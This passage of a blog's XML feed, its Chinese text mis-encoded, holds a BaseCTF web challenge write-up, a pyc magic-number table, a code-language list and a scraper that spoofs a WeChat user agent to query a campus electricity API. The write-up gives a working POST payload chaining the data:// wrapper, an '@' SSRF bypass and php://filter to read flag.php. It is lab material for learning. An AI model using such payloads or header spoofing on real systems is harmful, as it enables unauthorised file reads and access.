  </entry>
  
  
  
  <entry>
    <title>Basectfweb</title>
    <link href="/2024/09/15/Basectfweb/"/>
    <url>/2024/09/15/Basectfweb/</url>
    
    <content type="html"><![CDATA[<p>webåˆå­¦è€…å°å†™å‡ ä¸ªwebé¢˜</p><h4 id="Aura-é…±çš„ç¤¼ç‰©"><a href="#Aura-é…±çš„ç¤¼ç‰©" class="headerlink" title="Aura é…±çš„ç¤¼ç‰©"></a>Aura é…±çš„ç¤¼ç‰©</h4><p>å¼€å¯é¡µé¢æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Aura é…±ï¼Œæ¬¢è¿å›å®¶~</span><br><span class="hljs-comment">// è¿™é‡Œæœ‰ä¸€ä»½ç¤¼ç‰©ï¼Œè¯·ä½ ç­¾æ”¶ä¸€ä¸‹å“Ÿ~</span><br><span class="hljs-variable">$pen</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pen&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pen</span>) !== <span class="hljs-string">&#x27;Aura&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ç¤¼ç‰©æ”¶åˆ°å•¦ï¼Œæ¥ä¸‹æ¥è¦å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~</span><br><span class="hljs-variable">$challenge</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$challenge</span>, <span class="hljs-string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$blog_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$challenge</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$blog_content</span>, <span class="hljs-string">&#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;</span>) === <span class="hljs-literal">false</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// å˜¿å˜¿ï¼Œæ¥ä¸‹æ¥è¦æ‹†å¼€ç¤¼ç‰©å•¦ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œç¤¼ç‰©åœ¨ flag.php é‡Œé¢å“¦~</span><br><span class="hljs-variable">$gift</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gift&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$gift</span>);<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œäº†è§£è¯»å–æ–‡ä»¶åçš„å†…å®¹æ˜¯Auraå°è¯•data:&#x2F;&#x2F;ä¸ºåè®®æ¥è¯»å–<br>ç¬¬äºŒä¸ªåˆ¤æ–­åˆ©ç”¨äº†@çš„ssrfç»•è¿‡<br>ç¬¬ä¸‰ä¸ªé‡‡ç”¨äº†phpä¼ªåè®®çš„æ•°æ®ä¼ è¾“</p><pre><code class="hljs">POST / HTTP/1.1Host: challenge.basectf.fun:36145Cache-Control: max-age=0Accept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Length: 138Content-Type: application/x-www-form-urlencodedpen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@127.0.0.1&amp;gift=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>&lt;?php &#x2F;&#x2F; BaseCTF{81918213-ed45-40b9-b751-99e831a0bc75}  Aura é…±æœ‰æ‹¿åˆ°ä¸€è¡€å—ï¼Ÿ</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pythonticke</title>
    <link href="/2024/09/15/pythonticke/"/>
    <url>/2024/09/15/pythonticke/</url>
    
    <content type="html"><![CDATA[<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">enum PycMagic &#123;<br>    MAGIC_1_0 = <span class="hljs-number">0x00999902</span>,<br>    MAGIC_1_1 = <span class="hljs-number">0x00999903</span>, /* Also covers <span class="hljs-number">1.2</span> */<br>    MAGIC_1_3 = <span class="hljs-number">0x0A0D2E89</span>,<br>    MAGIC_1_4 = <span class="hljs-number">0x0A0D1704</span>,<br>    MAGIC_1_5 = <span class="hljs-number">0x0A0D4E99</span>,<br>    MAGIC_1_6 = <span class="hljs-number">0x0A0DC4FC</span>,<br> <br>    MAGIC_2_0 = <span class="hljs-number">0x0A0DC687</span>,<br>    MAGIC_2_1 = <span class="hljs-number">0x0A0DEB2A</span>,<br>    MAGIC_2_2 = <span class="hljs-number">0x0A0DED2D</span>,<br>    MAGIC_2_3 = <span class="hljs-number">0x0A0DF23B</span>,<br>    MAGIC_2_4 = <span class="hljs-number">0x0A0DF26D</span>,<br>    MAGIC_2_5 = <span class="hljs-number">0x0A0DF2B3</span>,<br>    MAGIC_2_6 = <span class="hljs-number">0x0A0DF2D1</span>,<br>    MAGIC_2_7 = <span class="hljs-number">0x0A0DF303</span>,<br> <br>    MAGIC_3_0 = <span class="hljs-number">0x0A0D0C3A</span>,<br>    MAGIC_3_1 = <span class="hljs-number">0x0A0D0C4E</span>,<br>    MAGIC_3_2 = <span class="hljs-number">0x0A0D0C6C</span>,<br>    MAGIC_3_3 = <span class="hljs-number">0x0A0D0C9E</span>,<br>    MAGIC_3_4 = <span class="hljs-number">0x0A0D0CEE</span>,<br>    MAGIC_3_5 = <span class="hljs-number">0x0A0D0D16</span>,<br>    MAGIC_3_5_3 = <span class="hljs-number">0x0A0D0D17</span>,<br>    MAGIC_3_6 = <span class="hljs-number">0x0A0D0D33</span>,<br>    MAGIC_3_7 = <span class="hljs-number">0x0A0D0D42</span>,<br>    MAGIC_3_8 = <span class="hljs-number">0x0A0D0D55</span>,<br>    MAGIC_3_9 = <span class="hljs-number">0x0A0D0D61</span>,<br>    MAGIC_3_10 = <span class="hljs-number">0x0A0D0D6F</span>,<br>    MAGIC_3_11 = <span class="hljs-number">0x0A0D0DA7</span>,<br>    MAGIC_3_12 = <span class="hljs-number">0x0A0D0DCB</span>,<br> <br>    INVALID = <span class="hljs-number">0</span>,<br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdownè¯­æ³•</title>
    <link href="/2024/09/14/markdown%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/09/14/markdown%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs">languagekey1C1cActionScriptactionscriptApacheapacheAppleScriptapplescriptAsciiDocasciidocAspectJasciidocAutoHotkeyautohotkeyAVR AssembleravrasmAxaptaaxaptaBashbashBrainFuckbrainfuckCapâ€™n ProtocapnprotoClojure REPLclojureClojureclojureCMakecmakeCoffeeScriptcoffeescriptC++cppC#csCSScssDdDartdDelphidelphiDiffdiffDjangodjangoDOS.batdosDustdustElixirelixirERB(Embedded Ruby)erbErlang REPLerlang-replErlangerlangFIXfixF#fsharpG-code(ISO 6983)gcodeGherkingherkinGLSLglslGogoGradlegradleGroovygroovyHamlhamlHandlebarshandlebarsHaskellhaskellHaxehaxeHTMLhtmlHTTPhttpIni fileiniJavajavaJavaScriptjavascriptJSONjsonLassolassoLesslessLisplispLiveCodelivecodeserverLiveScriptlivescriptLualuaMakefilemakefileMarkdownmarkdownMathematicamathematicaMatlabmatlabMEL (Maya Embedded Language)melMercurymercuryMizarmizarMonkeymonkeyNginxnginxNimrodnimrodNixnixNSISnsisObjective CobjectivecOCamlocamlOxygeneoxygeneParser 3parser3PerlperlPHPphpPowerShellpowershellProcessingprocessingPythonâ€™s profiler outputprofileProtocol BuffersprotobufPuppetpuppetPythonpythonQqRrRenderMan RIBribRoboconfroboconfRenderMan RSLrslRubyrubyOracle Rules LanguageruleslanguageRustrustScalascalaSchemeschemeScilabscilabSCSSscssSmalismaliSmallTalksmalltalkSMLsmlSQLsqlStatastataSTEP Part21(ISO 10303-21)step21StylusstylusSwiftswiftTcltclTextextexttext/plainThriftthriftTwigtwigTypeScripttypescriptValavalaVB.NETvbnetVBScript in HTMLvbscript-htmlVBScriptvbscriptVerilogverilogVHDLvhdlVim ScriptvimIntel x86 Assemblyx86asmXLxlXMLxmlYAMLyml</code></pre>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çˆ¬è™«åˆè¯†</title>
    <link href="/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>ç”±äºå¯å®¤è€æ˜¯æ²¡ç”µå¯¼è‡´æˆ‘çš„ç”µè„‘å¤„äºå·¥ä½œçŠ¶æ€å¼€æœºï¼Œæ°”æ­»æˆ‘äº†ï¼Œæˆ‘ä¾¿æƒ³ç”¨pythonæ¥äº†è§£ç›®å‰çš„ç”µè´¹æ˜¯å¤šå°‘å¹¶ç»™æˆ‘å‘é‚®ä»¶ï¼Œé¦–å…ˆæˆ‘ä»¬è¦äº†è§£ä¸€ä¸‹åŸºæœ¬çš„pythonå‘é€å“åº”åŒ…çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># å‘é€ GET è¯·æ±‚</span><br>url = <span class="hljs-string">&#x27;https://example.com&#x27;</span>  <span class="hljs-comment"># å°†æ­¤æ›¿æ¢ä¸ºä½ è¦è®¿é—®çš„ç½‘å€</span><br>response = requests.get(url)<br><br><span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯·æ±‚æˆåŠŸï¼&quot;</span>)<br>    <span class="hljs-comment"># è·å–ç½‘é¡µå†…å®¹</span><br>    content = response.text  <span class="hljs-comment"># è¿”å›HTMLå†…å®¹</span><br>    <span class="hljs-built_in">print</span>(content)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç ï¼š<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># å‘é€ POST è¯·æ±‚</span><br>url = <span class="hljs-string">&#x27;https://example.com/api&#x27;</span>  <span class="hljs-comment"># å°†æ­¤æ›¿æ¢ä¸ºå®é™…çš„API URL</span><br>data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;your_username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;your_password&#x27;</span>&#125;  <span class="hljs-comment"># ä¼ é€’çš„æ•°æ®</span><br>response = requests.post(url, data=data)<br><br><span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;POST è¯·æ±‚æˆåŠŸï¼&quot;</span>)<br>    <span class="hljs-comment"># è·å–å“åº”å†…å®¹</span><br>    <span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç ï¼š<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨äº†è§£ä¹‹åæˆ‘ä»¬ç”¨bpæŠ“åŒ…ï¼Œå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¸å†å¾®ä¿¡ç¨‹åºæ—¶ç½‘é¡µä¼šæœ‰ä¸€ä¸ªè‡ªæ ¡éªŒçš„æƒ…å†µï¼Œè®©æˆ‘ä»¬åœ¨å¾®ä¿¡ä¸­æ‰“å¼€ï¼Œè¿™æ— ç–‘æ˜¯æˆ‘ä»¬ä¸å¸Œæœ›çš„ä¸è¿‡æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ‘ä»¬çš„è¯·æ±‚å¤´éƒ¨ä¼ªé€ æˆ‘ä»¬åœ¨å¾®ä¿¡ä¸­çš„æƒ…æ™¯</p><p>è¿™æ˜¯åœ¨User agent ä¿®æ”¹ï¼Œè¿™æ ·æœåŠ¡ç«¯ä¾¿ä¼šè®¤ä¸ºæˆ‘ä»¬åœ¨å¾®ä¿¡ä¸­äº†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 &gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æˆ‘ä»¬çš„è¯·æ±‚æŠ¥æ–‡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">POST /app/app/api/user/searchBindHouseListForMoney HTTP/1.1<br>Host: xdxfdf.xtu.edu.cn<br>Content-Length: 58<br>Accept: application/json, text/javascript, */*; q=0.01<br>X-Requested-With: XMLHttpRequest<br>Accept-Language: zh-CN<br>User-Agent: Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 &gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>Origin: http://xdxfdf.xtu.edu.cn<br>Referer: http://xdxfdf.xtu.edu.cn/app/api/main/wxpay/payStepOne?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br>Accept-Encoding: gzip, deflate, br<br>Cookie: JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXX<br>Connection: keep-alive<br><br>wxId=XXXXXXXXXXXXXXXXXXX&amp;appId=XXXXXXXXXXXXXXXXXXXXXXX<br></code></pre></td></tr></table></figure><p>åœ¨pythonä¸­çš„å†™æ³•ä¾¿æ˜¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-comment"># è¯·æ±‚çš„ URL</span><br>url = <span class="hljs-string">&quot;https://xdxfdf.xtu.edu.cn/app/app/api/user/searchBindHouseListForMoney&quot;</span><br>headers = &#123;<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;JSESSIONID=XXXXXXXXXXXXXXXXX&quot;</span>,<br>        &#125;<br>data = &#123;<br>    <span class="hljs-string">&quot;wxId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>    <span class="hljs-string">&quot;appId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>&#125;<br>response = requests.post(url, headers=headers,data=data)<br><span class="hljs-comment"># æ£€æŸ¥å“åº”çŠ¶æ€ç </span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯·æ±‚æˆåŠŸï¼&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å“åº”å†…å®¹:&quot;</span>, response.json())  <span class="hljs-comment"># å‡è®¾è¿”å›çš„å†…å®¹æ˜¯ JSON æ ¼å¼</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç ï¼š<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å“åº”å†…å®¹:&quot;</span>, response.text)<br></code></pre></td></tr></table></figure><p>å¯è§é‡è¦çš„å…¶å®æ˜¯cookie<br>æˆ‘ä»¬çš„å“åº”å†…å®¹æ˜¯(jsonè½¬ä¹‰åçš„)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>&#x27;data&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;house_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;meter_status&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;sysId&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">64.18</span><span class="hljs-punctuation">,</span> &#x27;meter_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance_time&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">20240914225456</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;buy_time&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;free_balance&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">000017001111</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXXXXXXXXXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_customer_flag&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">0</span>&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;msg&#x27;<span class="hljs-punctuation">:</span> &#x27;&#x27;<span class="hljs-punctuation">,</span> &#x27;ret&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸè·å–æˆ‘ä»¬è¦çš„æŠ¥æ–‡åæˆ‘ä»¬äº†è§£äº†åœ¨pythonä¸­å­˜åœ¨ä¸€ä¸ªäº¤SMTPçš„åº“ï¼Œè‡ªå¸¦çš„ç«Ÿç„¶æ˜¯,ç›´æ¥è´´ä½¿ç”¨ä»£ç ï¼Œçœ‹å¾—æ›´æ¸…æ¥šäº›</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br> <br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-keyword">from</span> email.mime.text <span class="hljs-keyword">import</span> MIMEText<br><span class="hljs-keyword">from</span> email.header <span class="hljs-keyword">import</span> Header<br> <br><span class="hljs-comment"># ç¬¬ä¸‰æ–¹ SMTP æœåŠ¡</span><br>mail_host=<span class="hljs-string">&quot;smtp.XXX.com&quot;</span>  <span class="hljs-comment">#è®¾ç½®æœåŠ¡å™¨</span><br>mail_user=<span class="hljs-string">&quot;XXXX&quot;</span>    <span class="hljs-comment">#ç”¨æˆ·å</span><br>mail_pass=<span class="hljs-string">&quot;XXXXXX&quot;</span>   <span class="hljs-comment">#å£ä»¤ </span><br> <br> <br>sender = <span class="hljs-string">&#x27;from@runoob.com&#x27;</span><br>receivers = [<span class="hljs-string">&#x27;429240967@qq.com&#x27;</span>]  <span class="hljs-comment"># æ¥æ”¶é‚®ä»¶ï¼Œå¯è®¾ç½®ä¸ºä½ çš„QQé‚®ç®±æˆ–è€…å…¶ä»–é‚®ç®±</span><br> <br>message = MIMEText(<span class="hljs-string">&#x27;Python é‚®ä»¶å‘é€æµ‹è¯•...&#x27;</span>, <span class="hljs-string">&#x27;plain&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;From&#x27;</span>] = Header(<span class="hljs-string">&quot;èœé¸Ÿæ•™ç¨‹&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;To&#x27;</span>] =  Header(<span class="hljs-string">&quot;æµ‹è¯•&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br>subject = <span class="hljs-string">&#x27;Python SMTP é‚®ä»¶æµ‹è¯•&#x27;</span><br>message[<span class="hljs-string">&#x27;Subject&#x27;</span>] = Header(subject, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br> <br><span class="hljs-keyword">try</span>:<br>    smtpObj = smtplib.SMTP() <br>    smtpObj.connect(smtp.qq.com, <span class="hljs-number">25</span>)    <span class="hljs-comment"># 25 ä¸º SMTPç«¯å£å· 456ä¸ºsshåŠ å¯†ç«¯å£å·</span><br>    smtpObj.login(mail_user,mail_pass)  <span class="hljs-comment">#ç”¨æˆ·çš„é‚®ç®±å·ï¼Œpassä¸æ˜¯å¯†ç æ˜¯SMTPæˆæƒå·ç </span><br>    smtpObj.sendmail(sender, receivers, message.as_string())<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;é‚®ä»¶å‘é€æˆåŠŸ&quot;</span><br><span class="hljs-keyword">except</span> smtplib.SMTPException:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error: æ— æ³•å‘é€é‚®ä»¶&quot;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å¼€å¯qqé‚®ç®±çš„smtpæœåŠ¡,äº†è§£äº†<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023941.png" srcset="/img/loading.gif" lazyload><br>é¡ºä¾¿è´´ä¸€ä¸ªFromçš„æ ¼å¼æˆ‘åœ¨è¿™é‡Œå¡ä½äº†ã€‚ã€‚ã€‚é‚®ç®±æ ¼å¼è¦æ­£ç¡®å‘œå‘œå‘œ<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023846.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crawler</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF202409</title>
    <link href="/2024/09/14/BaseCTF202409/"/>
    <url>/2024/09/14/BaseCTF202409/</url>
    
